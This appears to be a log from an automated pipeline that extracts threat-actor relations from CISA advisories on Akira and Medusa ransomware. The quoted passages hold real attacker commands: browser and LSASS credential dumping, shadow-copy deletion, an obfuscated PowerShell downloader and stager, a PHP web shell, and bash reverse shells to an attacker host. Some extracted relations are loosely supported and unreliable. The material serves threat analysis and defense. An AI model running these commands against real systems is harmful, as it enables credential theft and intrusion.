0b5b31af5956158bfbd14f6cbf4f1bca23c5d16a40dbf3758f3289146c565f43
0d700ca5f6cc093de4abba9410480ee7a8870d5e8fe86c9ce103eec3872f225f
a2df5477cf924bd41241a3326060cc2f913aff2379858b148ddec455e4da67bc
03aa12ac2884251aa24bf0ccd854047de403591a8537e6aba19e822807e06a45



## AA24-109A:evaluation:llama500:26404:27411

Status: candidates_ready_for_review
Case time: 3.11 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

cf924bd41241a3326060cc2f913aff2379858b148ddec455e4da67bc
03aa12ac2884251aa24bf0ccd854047de403591a8537e6aba19e822807e06a45
2e88e55cc8ee364bf90e7a51671366efb3dac3e9468005b044164ba0f1624422
40221e1c2e0c09bc6104548ee847b6ec790413d6ece06ad675fff87e5b8dc1d5
5ea65e2bb9d245913ad69ce90e3bd9647eb16d992301145372565486c77568a2
643061ac0b51f8c77f2ed202dc91afb9879f796ddd974489209d45f84f644562
6f9d50bab16b2532f4683eeb76bd25449d83bdd6c85bf0b05f716a4b49584f84
fef09b0aa37cbdb6a8f60a6bd8b473a7e5bffdc7fd2e952444f781574abccf64
Table 7. Linux/Unix Akira Ransomware Executable and Linkable Format Samples
Hash (SHA-256)
e1321a4b2b104f31aceaf4b19c5559e40ba35b73a754d3ae13d8e90c53146c0f
74f497088b49b745e6377b32ed5d9dfaef3c84c7c0bb50fabf30363ad2e0bfb1
3d2b58ef6df743ce58669d7387ff94740ceb0122c4fc1c4ffd81af00e72e60a4
Table 8. Commands Used for Discovery
Commands
nltest /dclist: [T1018]
nltest /DOMAIN_TRUSTS [T1482]
net group “Domain admins” /dom [T1069.002]
net localgroup “Administrators” /dom [T1069.001]
tasklist [T1057]


- nltest -> USES_TECHNIQUE -> T1018
  Literal support: nltest /dclist: [T1018]
- nltest -> USES_TECHNIQUE -> T1482
  Literal support: nltest /DOMAIN_TRUSTS [T1482]
- net -> USES_TECHNIQUE -> T1069.002
  Literal support: net group “Domain admins” /dom [T1069.002]
- net -> USES_TECHNIQUE -> T1069.001
  Literal support: net localgroup “Administrators” /dom [T1069.001]

## AA24-109A:evaluation:llama500:27250:29059

Status: empty_extraction
Case time: 0.59 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

test /dclist: [T1018]
nltest /DOMAIN_TRUSTS [T1482]
net group “Domain admins” /dom [T1069.002]
net localgroup “Administrators” /dom [T1069.001]
tasklist [T1057]
Table 9. Commands Used for Credential Access
Commands
cmd.exe /Q /c esentutl.exe /y
"C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<firefox_profile_id>.defaultrelease\key4.db" /d
"C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<firefox_profile_id>.defaultrelease\key4.db.tmp”
Note: Akira threat actors use these commands to access Firefox data.
cmd.exe /Q /c esentutl.exe /y
"C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /d
"C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Login Data.tmp”
Note: Akira threat actors use these commands to access Google Chrome data.
powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject" [T1490]
rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\windows\temp\lsass.dmp full [T1003.001]
MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 10 through Table 21 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Table 10. Initial Access
Technique Title
ID
Use
Valid Accounts
T1078
Akira threat actors obtain and abuse credentials of existing accounts to gain initial access.
External Remote Services
T1133
Akira threat actors use remote access services, such as RDP or VPN connections, to gain initial access.
Exploit Public Facing Application
T1190
Akira threat actors exploit vulnerabilities in internet-facing systems to gain access to systems.
Phishing: Spearphishing Attachment
T1566.001



## AA24-109A:evaluation:llama500:28777:31133

Status: candidates_ready_for_review
Case time: 2.97 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

 threat actors use remote access services, such as RDP or VPN connections, to gain initial access.
Exploit Public Facing Application
T1190
Akira threat actors exploit vulnerabilities in internet-facing systems to gain access to systems.
Phishing: Spearphishing Attachment
T1566.001
Akira threat actors use phishing emails with malicious attachments to gain access to networks.
Phishing: Spearphishing Link
T1566.002
Akira threat actors use phishing emails with malicious links to gain access to networks.
Table 11. Execution
Technique Title
ID
Use
Update Nov. 13, 2025
Command and Scripting Interpreter: PowerShell
T1059.001
Akira threat actors use PowerShell to execute malicious scripts and Living Off the Land Binary (LOLBin) commands for execution, persistence, credential harvesting, lateral movement, and disabling security controls to evade detection.
After using Ngrok to establish encrypted sessions, Akira threat actors use PowerShell and WMIC to disable services and execute malicious scripts.
Akira threat actors use commercial penetration testing tools, namely Cobalt Strike, during their operations to achieve lateral movement, perform C2 procedures, and gain elevated privileges.
End Update
Command and Scripting Interpreter: Windows Command Shell
T1059.003
Akira threat actors use the Windows command shell (cmd.exe) to run batch scripts and native commands for execution, persistence, lateral movement, and to disable or manipulate security controls for evasion.
Update Nov. 13, 2025
Command and Scripting Interpreter: Visual Basic
T1059.005
Akira threat actors use VB scripts to execute malicious code, deploy ransomware payloads, or establish persistence through legitimate Windows scripting capabilities.
System Services: Service Execution
T1569.002
Akira threat actors use PSEXESVC.exe to enable remote code execution and deploy payloads.
End Update
Table 12. Persistence
Technique Title
ID
Use
Update Nov. 13, 2025
Account Manipulation
T1098
Akira threat actors modify account passwords.
Create Account: Local Account
T1136.001
Akira threat actors can create local user accounts by adding them to local admin groups to establish persistent backdoors.
End Update
Create Account: Domain Account
T1136.002
Akira threat actors attempt to abuse the functions of domain controllers by creating new domain accounts to establish persistence.


- Akira threat actors -> USES -> Ngrok
  Literal support: After using Ngrok to establish encrypted sessions, Akira threat actors use PowerShell and WMIC to disable services and execute malicious scripts.
- Akira threat actors -> USES -> Cobalt Strike
  Literal support: Akira threat actors use commercial penetration testing tools, namely Cobalt Strike, during their operations to achieve lateral movement, perform C2 procedures, and gain elevated privileges.
- Akira threat actors -> USES -> cmd.exe
  Literal support: Akira threat actors use the Windows command shell (cmd.exe) to run batch scripts and native commands for execution, persistence, lateral movement, and to disable or manipulate security controls for evasion.
- Akira threat actors -> USES -> PSEXESVC.exe
  Literal support: Akira threat actors use PSEXESVC.exe to enable remote code execution and deploy payloads.

## AA24-109A:evaluation:llama500:30823:33030

Status: candidates_ready_for_review
Case time: 1.12 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

001
Akira threat actors can create local user accounts by adding them to local admin groups to establish persistent backdoors.
End Update
Create Account: Domain Account
T1136.002
Akira threat actors attempt to abuse the functions of domain controllers by creating new domain accounts to establish persistence.
Table 13. Privilege Escalation
Technique Title
ID
Use
Exploitation for Privilege Escalation
T1068
Akira threat actors exploit unpatched software vulnerabilities (e.g., Veeam Backup and Replication CVEs) to gain elevated privileges on hosts or servers (enabling access to sensitive data), and for credential harvesting.
Update Nov. 13, 2025
Akira threat actors use POORTRY malware written as a signed vulnerable Windows driver to deploy BYOVD techniques to obtain elevated privileges.
End Update
Table 14. Defense Evasion
Technique Title
ID
Use
Update Nov. 13, 2025
Obfuscated Files or Information
T1027
Akira threat actors obfuscate or encrypt malware, scripts, and network payloads (e.g., packers, Base64/XOR encoding, script obfuscation, or custom encryption) to evade detection and slow forensic analysis.
Obfuscated Files or Information: Compression
T1027.015
Akira threat actors use an archive feature within the 7-zip tool to compress data to evade detection.
Masquerading
T1036
Akira threat actors disguise malicious files and payloads to appear legitimate.
File and Directory Permissions Modification: Windows File and Directory Permissions Modification
T1222.001
Akira threat actors use the takedown command to assume ownership of directories and files and use the icacls command to modify discretionary access control lists.
End Update
Impair Defenses: Disable or Modify Tools
T1562.001
Akira threat actors use a BYOVD technique to disable antivirus software.
Update Nov. 13, 2025
Akira threat actors use PowerTool to exploit Zemana AntiMalware driver and terminate antivirus defensive processes.
Akira threat actors uninstall EDR systems to evade endpoint detection.
End Update
Update Nov. 13, 2025
Impair Defenses: Disable or Modify System Firewall
T1562.004
Akira threat actors use the allssh modify_firewall command to open specific ports on the eth0 interface.
Proxy Through Victim


- Akira threat actors -> USES -> POORTRY
  Literal support: Akira threat actors use POORTRY malware written as a signed vulnerable Windows driver to deploy BYOVD techniques to obtain elevated privileges.

## AA24-109A:evaluation:llama500:32784:35082

Status: service_error
Case time: 1.38 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

 evade endpoint detection.
End Update
Update Nov. 13, 2025
Impair Defenses: Disable or Modify System Firewall
T1562.004
Akira threat actors use the allssh modify_firewall command to open specific ports on the eth0 interface.
Proxy Through Victim
T1604
Akira threat actors use a compromised device as a proxy server to conceal their malicious C2 infrastructure and associated IP address from network defenders.
End Update
Table 15. Credential Access
Technique Title
ID
Use
OS Credential Dumping
T1003
Akira threat actors use tools like Mimikatz and LaZagne to dump credentials.
OS Credential Dumping: LSASS Memory
T1003.001
Akira threat actors attempt to access credential material stored in the process memory of LSASS.
Update Nov. 13, 2025
OS Credential Dumping: Security Account Manager
T1003.002
Akira threat actors dump the Windows security account manager (SAM) database to extract local account password hashes for offline cracking or pass-the-hash techniques, enabling lateral movement and privilege escalation on compromised hosts.
OS Credential Dumping: NTDS
T1003.003
Akira threat actors dump the Active Directory database (NTDS.dit) from compromised domain controllers to harvest domain credentials, enabling privilege escalation, lateral movement, and full domain takeover.
Brute Force
T1110
Akira threat actors gain access by brute-forcing VPN logins and SSH endpoints.
Brute Force: Password Spraying
T1110.003
Akira threat actors use tools like SharpDomainSpray for password spraying.
Credentials from Password Stores
T1555
Akira threat actors dump credentials from repositories like the Variable Bit Rate (VBR)-configuration database.
Akira threat actors use LaZagne to recover stored passwords on Windows, Linux, and macOS systems.
Credentials from Password Stores: Credentials from Web Browsers
T1555.003
Akira threat actors use NetExec with the --dpapi option to dump credentials from the Windows Credential Manager and web browsers.
Credentials from Password Stores: Windows Credential Manager
T1555.004
Akira threat actors leverage tools such as NetExec or Mimikatz with the –dpapi option to dump credentials stored in the Windows Credential Manager, allowing them to gain unauthorized access to additional systems or accounts within the network.
End Update
Table 16. Discovery


Error: HTTPError: 500 Server Error: Internal Server Error for url: http://localhost:11434/api/generate: an error was encountered while running the model: read tcp 127.0.0.1:63452->127.0.0.1:58090: wsarecv: An existing connection was forcibly closed by the remote host.

## AA24-109A:evaluation:llama500:34797:37085

Status: candidates_ready_for_review
Case time: 8.48 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

T1555.004
Akira threat actors leverage tools such as NetExec or Mimikatz with the –dpapi option to dump credentials stored in the Windows Credential Manager, allowing them to gain unauthorized access to additional systems or accounts within the network.
End Update
Table 16. Discovery
Technique Title
ID
Use
System Network Configuration Discovery
T1016
Akira threat actors use tools to scan systems and identify services running on remote hosts and local network infrastructure.
Remote System Discovery
T1018
Akira threat actors use nltest /dclist: to amass a listing of other systems by IP address, hostname, or other logical identifiers on a network.
Network Service Discovery
T1046
Akira threat actors use Advanced IP Scanner and NetScan to perform network reconnaissance by locating computers, scanning ports, identifying network devices, accessing shared folders, and enabling remote control via RDP and Radmin.
Akira threat actors use SoftPerfect network scanners (netscan.exe) to perform discovery and retrieve network device information through WMI, SNMP, HTTP, SSH, and PowerShell.
Process Discovery
T1057
Akira threat actors use the Tasklist utility to obtain details on running processes via PowerShell.
Permission Groups Discovery: Local Groups
T1069.001
Akira threat actors use the net localgroup /dom to find local groups and permission settings.
Permission Groups Discovery: Domain Groups
T1069.002
Akira threat actors use the net group /domain command to find domain level groups and permission settings.
System Information Discovery
T1082
Akira threat actors use tools like PCHunter64 to acquire detailed process and system information.
Update Nov. 13, 2025
Akira threat actors use DiskCheck software to query remote systems for information on disk drives and installed software.
End Update
Update Nov. 13, 2025
Account Discovery: Domain Account
T1087.002
Akira threat actors use Adfind.exe to query and retrieve information from Active Directory.
End Update
Domain Trust Discovery
T1482
Akira threat actors use the net Windows command to enumerate domain information.
Update Nov. 13, 2025
Akira threat actors use nltest /DOMAIN_TRUSTS commands to enumerate domain trusts.
End Update
Table 17. Lateral Movement
Technique Title
ID
Use
Update Nov. 13, 2025
Remote Services


- Akira threat actors -> USES -> NetExec
  Literal support: Akira threat actors leverage tools such as NetExec or Mimikatz with the –dpapi option to dump credentials stored in the Windows Credential Manager, allowing them to gain unauthorized access to additional systems or accounts within the network.
- Akira threat actors -> USES -> Mimikatz
  Literal support: Akira threat actors leverage tools such as NetExec or Mimikatz with the –dpapi option to dump credentials stored in the Windows Credential Manager, allowing them to gain unauthorized access to additional systems or accounts within the network.
- Akira threat actors -> USES -> Mimikatz with the –dpapi option
  Literal support: Akira threat actors leverage tools such as NetExec or Mimikatz with the –dpapi option to dump credentials stored in the Windows Credential Manager, allowing them to gain unauthorized access to additional systems or accounts within the network.
- Akira threat actors -> USES -> Windows Credential Manager
  Literal support: Akira threat actors leverage tools such as NetExec or Mimikatz with the –dpapi option to dump credentials stored in the Windows Credential Manager, allowing them to gain unauthorized access to additional systems or accounts within the network.

## AA24-109A:evaluation:llama500:36883:38919

Status: candidates_ready_for_review
Case time: 3.02 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

Update Nov. 13, 2025
Akira threat actors use nltest /DOMAIN_TRUSTS commands to enumerate domain trusts.
End Update
Table 17. Lateral Movement
Technique Title
ID
Use
Update Nov. 13, 2025
Remote Services
T1021
Akira threat actors can abuse remote services (such as SSH and Virtual Network Computing [VNC]), to remotely access compromised systems, move laterally, and maintain persistence across networked hosts.
Remote Service: RDP
T1021.001
Akira threat actors leverage RDP connections as an initial access vector to victim systems.
Remote Service: SSH
T1021.004
Akira threat actors use SSHs through router IP addresses for initial access.
Use Alternate Authentication Material: Pass the Hash
T1550.002
Akira threat actors use Mimikatz to view and save authentication credentials, such as Kerberos tickets.
End Update
Table 18. Collection
Technique Title
ID
Use
Archive Collected Data: Archive via Utility
T1560.001
Akira threat actors use tools like WinRAR to compress files.
Table 19. Command and Control
Technique Title
ID
Use
Proxy
T1090
Akira threat actors use Ngrok to create a secure tunnel to servers the actors use to exfiltrate data.
Update Nov. 13, 2025
Akira threat actors use SystemBC malware as a proxy bot.
End Update
Update Nov. 13, 2025
Ingress Tool Transfer
T1105
Akira threat actors download tools, many of which are staged in the PerfLogs directory, and use the WebClient.DownloadString() method to download Cobalt Strike beacons.
Akira threat actors use STONESTOP malware to load additional payloads.
End Update
Remote Access Software
T1219
Akira threat actors use legitimate desktop support software like AnyDesk to obtain remote access to victim systems.
Update Nov. 13, 2025
Akira threat actors use SystemBC malware as a RAT.
End Update
Update Nov. 13, 2025
Protocol Tunneling
T1572
Akira treat actors use Ngrok to hide C2 and remote access/exfiltrate traffic inside legitimate HTTPS connections, bypass perimeter defenses, and maintain covert persistent access.
End Update
Table 20. Exfiltration
Technique Title


- Akira threat actors -> USES -> nltest
  Literal support: Akira threat actors use nltest /DOMAIN_TRUSTS commands to enumerate domain trusts.
- Akira threat actors -> USES -> Mimikatz
  Literal support: Akira threat actors use Mimikatz to view and save authentication credentials, such as Kerberos tickets.
- Akira threat actors -> USES -> Ngrok
  Literal support: Akira threat actors use Ngrok to create a secure tunnel to servers the actors use to exfiltrate data.
- Akira threat actors -> USES -> Cobalt Strike
  Literal support: Akira threat actors download tools, many of which are staged in the PerfLogs directory, and use the WebClient.DownloadString() method to download Cobalt Strike beacons.

## AA24-109A:evaluation:llama500:37679:39746

Status: candidates_ready_for_review
Case time: 3.04 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

 tickets.
End Update
Table 18. Collection
Technique Title
ID
Use
Archive Collected Data: Archive via Utility
T1560.001
Akira threat actors use tools like WinRAR to compress files.
Table 19. Command and Control
Technique Title
ID
Use
Proxy
T1090
Akira threat actors use Ngrok to create a secure tunnel to servers the actors use to exfiltrate data.
Update Nov. 13, 2025
Akira threat actors use SystemBC malware as a proxy bot.
End Update
Update Nov. 13, 2025
Ingress Tool Transfer
T1105
Akira threat actors download tools, many of which are staged in the PerfLogs directory, and use the WebClient.DownloadString() method to download Cobalt Strike beacons.
Akira threat actors use STONESTOP malware to load additional payloads.
End Update
Remote Access Software
T1219
Akira threat actors use legitimate desktop support software like AnyDesk to obtain remote access to victim systems.
Update Nov. 13, 2025
Akira threat actors use SystemBC malware as a RAT.
End Update
Update Nov. 13, 2025
Protocol Tunneling
T1572
Akira treat actors use Ngrok to hide C2 and remote access/exfiltrate traffic inside legitimate HTTPS connections, bypass perimeter defenses, and maintain covert persistent access.
End Update
Table 20. Exfiltration
Technique Title
ID
Use
Exfiltration Over Alternative Protocol
T1048
Akira threat actors use file transfer tools like WinSCP to transfer data.
Transfer Data to Cloud Account
T1537
Akira threat actors use tools like CloudZilla to exfiltrate data to a cloud account and connect to exfiltration servers they control.
Exfiltration Over Web Service: Exfiltration to Cloud Storage
T1567.002
Akira threat actors leverage RClone to sync files with cloud storage services to exfiltrate data.
Table 21. Impact
Technique Title
ID
Use
Date Encrypted for Impact
T1486
Akira threat actors encrypt data on target systems to interrupt availability to system and network resources.
Inhibit System Recovery
T1490
Akira threat actors delete VSS copies on Windows systems.
Financial Theft
T1657
Akira threat actors use a double extortion model for financial gain.


- Akira threat actors -> USES -> WinRAR
  Literal support: Akira threat actors use tools like WinRAR to compress files.
- Akira threat actors -> USES -> Ngrok
  Literal support: Akira threat actors use Ngrok to create a secure tunnel to servers the actors use to exfiltrate data.
- Akira threat actors -> USES -> Cobalt Strike
  Literal support: Akira threat actors download tools, many of which are staged in the PerfLogs directory, and use the WebClient.DownloadString() method to download Cobalt Strike beacons.
- Akira threat actors -> USES -> WinSCP
  Literal support: Akira threat actors use file transfer tools like WinSCP to transfer data.

## AA25-071A:evaluation:llama500:4851:6963

Status: candidates_ready_for_review
Case time: 2.58 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:


Note: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 19. See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
Background
(Updated Aug. 18, 2026) Since 2021, Medusa actors have used the Medusa variant to conduct ransomware attacks through at least April 2026. Medusa originally operated as a closed ransomware operation, meaning the same group of cyber threat actors controlled all development and associated ransomware campaigns. Since at least early 2023, Medusa progressed to using an affiliate model, selling RaaS to affiliates who are granted varying levels of trust based upon experience and profitability. For newer or less experienced affiliates, important operations such as ransom negotiation may be centrally controlled by the developers. Medusa actors use a double-extortion model where they encrypt victim data and threaten to publicly release exfiltrated data if a ransom is not paid.
Initial Access
Medusa actors typically recruit initial access brokers (IABs) in cybercriminal forums and marketplaces to obtain initial access to potential victims. They offer payments between $100 United States dollars (USD) and $1 million USD to IABs, as well as the opportunity to work exclusively for Medusa. Most IABs, however, appear to be willing to work for multiple variants at the same time. Medusa actors are known to make use of common techniques, such as:
Phishing campaigns as a primary method for stealing victim credentials [T1566].
Exploitation of unpatched software vulnerabilities [T1190] through Common Vulnerabilities and Exposures (CVEs) such as:
ScreenConnect vulnerability CVE-2024-1709 [CWE-288: Authentication Bypass Using an Alternate Path or Channel].
Fortinet EMS SQL injection vulnerability CVE-2023-48788 [CWE 89: SQL Injection].
(Updated, Aug. 18, 2026) Fortra GoAnywhere vulnerability CVE-2025-10035 [CWE-502: Deserialization of Untrusted Data].
(Updated, Aug. 18, 2026) BeyondTrust vulnerability CVE-2026-1731 [CWE-78: OS Command Injection].


- Medusa actors -> USES_TECHNIQUE -> T1566
  Literal support: Medusa actors are known to make use of common techniques, such as:
Phishing campaigns as a primary method for stealing victim credentials [T1566].
- Medusa actors -> USES_TECHNIQUE -> T1190
  Literal support: Medusa actors are known to make use of common techniques, such as:
Phishing campaigns as a primary method for stealing victim credentials [T1566].
Exploitation of unpatched software vulnerabilities [T1190] through Common Vulnerabilities and Exposures (CVEs) such as:
- Medusa actors -> USES -> ScreenConnect
  Literal support: Medusa actors are known to make use of common techniques, such as:
Phishing campaigns as a primary method for stealing victim credentials [T1566].
Exploitation of unpatched software vulnerabilities [T1190] through Common Vulnerabilities and Exposures (CVEs) such as:
ScreenConnect vulnerability CVE-2024-1709 [CWE-288: Authentication Bypass Using an Alternate Path or Channel].

## AA25-071A:evaluation:llama500:6767:8826

Status: empty_extraction
Case time: 0.43 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:

2026) Fortra GoAnywhere vulnerability CVE-2025-10035 [CWE-502: Deserialization of Untrusted Data].
(Updated, Aug. 18, 2026) BeyondTrust vulnerability CVE-2026-1731 [CWE-78: OS Command Injection].
(Updated Aug. 18, 2026) Medusa actors operate opportunistically by targeting victims with unpatched software rather than focusing on specific organizations or sectors; however, the Healthcare and Public Health (HPH) Sector has been a frequent victim of Medusa operations. Medusa actors leverage vulnerability announcements, such as the February 2026 publication of BeyondTrust vulnerability CVE-2026-1731, to identify CVEs to exploit. Medusa actors leverage newly announced exploits within 24 hours and have been observed to use exploits up to a week before public vulnerability disclosure.1 However, there is no indication Medusa actors develop their own zero-day or N-day vulnerabilities, preferring instead to obtain advanced access to exploits from unknown sources or to quickly leverage newly announced exploits before potential victims can mitigate vulnerabilities through patching.
(Updated Aug. 18, 2026) Medusa actors make use of Interactsh dynamic URLs to verify successful exploitation. Specifically, actors send HTTP requests to one of the Interactsh domains—oast[.]site, oast[.]pro, or oast[.]fun—embedding subdomain data that identifies the compromised host. For example, Medusa actors made requests to <victim-name>.<random-33-alphanumeric-characters>.oast.site, an open source, out-of-band (OOB) external server. This Interactsh server records these requests for the actors to review.
Persistence and Discovery
Medusa actors use living off the land (LOTL) techniques and legitimate tools, such as Advanced IP Scanner and SoftPerfect Network Scanner for initial user, system, and network enumeration. Once a foothold in a victim network is established, commonly scanned ports include:
21 (FTP)
22 (SSH)
23 (Telnet)
80 (HTTP)
115 (SFTP)
443 (HTTPS)
1433 (SQL database)
3050 (Firebird database)
3128 (HTTP web proxy)
3306 (MySQL database)
3389 (RDP)



## AA25-071A:evaluation:llama500:8653:10741

Status: candidates_ready_for_review
Case time: 2.64 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:

 include:
21 (FTP)
22 (SSH)
23 (Telnet)
80 (HTTP)
115 (SFTP)
443 (HTTPS)
1433 (SQL database)
3050 (Firebird database)
3128 (HTTP web proxy)
3306 (MySQL database)
3389 (RDP)
Medusa actors primarily use PowerShell [T1059.001] and the Windows Command Prompt (cmd.exe) [T1059.003] for network [T1046] and filesystem enumeration [T1083] and to utilize Ingress Tool Transfer capabilities [T1105]. Medusa actors use Windows Management Instrumentation (WMI) [T1047] for querying system information.
Stealth
Medusa actors exploit legitimate tools and use LOTL techniques to avoid detection. (See Appendix: Medusa Commands for associated shell commands observed during FBI investigations of Medusa victims.) Certutil (certutil.exe), an administrator utility used to manage public key infrastructure (PKI) and download files, is used to avoid detection when performing file ingress.
(Updated Aug. 18, 2026) Medusa actors also use Minidump (comsvcs.dll) to avoid detection when dumping Local Security Authority Subsystem Service (LSASS) credentials.
Medusa actors use several different PowerShell stealth techniques with increasing complexity; these are provided below. Additionally, Medusa actors attempt to cover their tracks by deleting the PowerShell command line history [T1070.003].
In this example, Medusa actors use a well-known stealth technique that executes a base64 encrypted command [T1027.013] using specific execution settings.
powershell -exec bypass -enc <base64 encrypted command string>
In another example, the DownloadFile string is obfuscated by slicing it into pieces and referencing it via a variable [T1027].
powershell -nop -c $x = 'D' + 'Own' + 'LOa' + 'DfI' + 'le'; Invoke-Expression (New-Object Net.WebClient).$x.Invoke(http://<ip>/<RAS tool>.msi)
In the final example, the payload is an obfuscated base64 string read into memory, decompressed from gzip, and used to create a scriptblock. The base64 payload is split using empty strings and concatenation and uses a format operator (-f) followed by three arguments to specify character replacements in the base64 payload.


- Medusa actors -> USES_TECHNIQUE -> T1059.001
  Literal support: Medusa actors primarily use PowerShell [T1059.001] and the Windows Command Prompt (cmd.exe) [T1059.003] for network [T1046] and filesystem enumeration [T1083] and to utilize Ingress Tool Transfer capabilities [T1105].
- Medusa actors -> USES_TECHNIQUE -> T1059.003
  Literal support: Medusa actors primarily use PowerShell [T1059.001] and the Windows Command Prompt (cmd.exe) [T1059.003] for network [T1046] and filesystem enumeration [T1083] and to utilize Ingress Tool Transfer capabilities [T1105].
- Medusa actors -> USES_TECHNIQUE -> T1046
  Literal support: Medusa actors primarily use PowerShell [T1059.001] and the Windows Command Prompt (cmd.exe) [T1059.003] for network [T1046] and filesystem enumeration [T1083] and to utilize Ingress Tool Transfer capabilities [T1105].
- Medusa actors -> USES_TECHNIQUE -> T1083
  Literal support: Medusa actors primarily use PowerShell [T1059.001] and the Windows Command Prompt (cmd.exe) [T1059.003] for network [T1046] and filesystem enumeration [T1083] and to utilize Ingress Tool Transfer capabilities [T1105].

## AA25-071A:evaluation:llama500:10438:12511

Status: candidates_ready_for_review
Case time: 1.69 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:

 the payload is an obfuscated base64 string read into memory, decompressed from gzip, and used to create a scriptblock. The base64 payload is split using empty strings and concatenation and uses a format operator (-f) followed by three arguments to specify character replacements in the base64 payload.
powershell -nop -w hidden -noni -ep bypass &([scriptblock]::create((
New-Object System.IO.StreamReader(
New-Object System.IO.Compression.GzipStream((
New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(
(('<base64 payload string>')-f'<character replacement 0>','<character replacement 1>', '<character replacement 2>')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
The obfuscated base64 PowerShell payload is identical to powerfun.ps1, a publicly available stager script that can create either a reverse or bind shell over Transport Layer Security (TLS) to load additional modules. In the bind shell, the script awaits a connection on local port 443 [T1071.001] and initiates a connection to a remote port 443 in the reverse shell.
In some instances, Medusa actors attempted to use vulnerable or signed drivers to kill or delete endpoint detection and response (EDR) tools [T1685].
(Updated Aug. 18, 2026) Medusa actors place tooling, such as Rclone, in pre-existing Windows Defender excluded folders for stealth. [T1564.012].
FBI has observed Medusa actors using the following tools to support command and control (C2) and stealth:
Ligolo-ng
A reverse tunneling tool often used to create secure connections between a compromised host and threat actor’s machine.
Cloudflared
Formerly known as ArgoTunnel.
Used to securely expose applications, services, or servers to the internet via Cloudflare Tunnel without exposing them directly.
(Updated Aug. 18, 2026) FBI has also observed Medusa actors using:
Nezha
An operations and maintenance server monitoring tool used to allow backdoor visibility to compromised hosts from the threat actor’s machine.
Publicly available on GitHub.
Installed using PowerShell on victim’s machine:


- Medusa actors -> USES -> Rclone
  Literal support: (Updated Aug. 18, 2026) Medusa actors place tooling, such as Rclone, in pre-existing Windows Defender excluded folders for stealth. [T1564.012].
- Medusa actors -> USES_TECHNIQUE -> T1564.012
  Literal support: (Updated Aug. 18, 2026) Medusa actors place tooling, such as Rclone, in pre-existing Windows Defender excluded folders for stealth. [T1564.012].

## AA25-071A:evaluation:llama500:12220:14519

Status: candidates_ready_for_review
Case time: 3.04 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:

Updated Aug. 18, 2026) FBI has also observed Medusa actors using:
Nezha
An operations and maintenance server monitoring tool used to allow backdoor visibility to compromised hosts from the threat actor’s machine.
Publicly available on GitHub.
Installed using PowerShell on victim’s machine:
$env:NZ_SERVER="83.138.53.139:80";$env:NZ_TLS="false";$env:NZ_CLIENT_SECRET="…"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12;set-ExecutionPolicy RemoteSigned;Invoke-WebRequest https://raw.githubusercontent.com/nezhahq/scripts/main/agent/install.ps1 -OutFile C:install.ps1;powershell.exe C:install.ps1
MeshAgent
MeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.
Publicly available on GitHub.
Apache/PHP Web Shell
file_save.php executes the contents of a POST request sent to /file_save on a victim web server. For contents of file_save.php, see below:
<?php if($_REQUEST[‘key’]==’UerT’) system($_REQUEST[‘x’]);?>
Bash Reverse Shell
Use of native Linux commands to create a reverse Transmission Control Protocol (TCP) connection to threat actor infrastructure:
bash -i >& /dev/tcp/<attacker IP>/4444 0>&1
bash -i >& /dev/tcp/<attacker IP>/443 0>&1
GSocket
Also known as Global Socket or gs-netcat.
Allows workstations on different private networks to connect and bypass firewalls.
Allows file transfers and command execution.
Lateral Movement, Credential Access, and Execution
(Updated Aug. 18, 2026) Medusa actors use a variety of legitimate remote monitoring and management (RMM) software [T1219]. To evade detection, they may tailor their choice based on remote access tools already present in the victim environment. 2,3 FBI identified Medusa actors using remote access software AnyDesk, Atera, ConnectWise, eHorus, N-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486]. When provided with valid username and password credentials, Medusa actors use PsExec to:


- Medusa actors -> USES_TECHNIQUE -> T1219
  Literal support: (Updated Aug. 18, 2026) Medusa actors use a variety of legitimate remote monitoring and management (RMM) software [T1219].
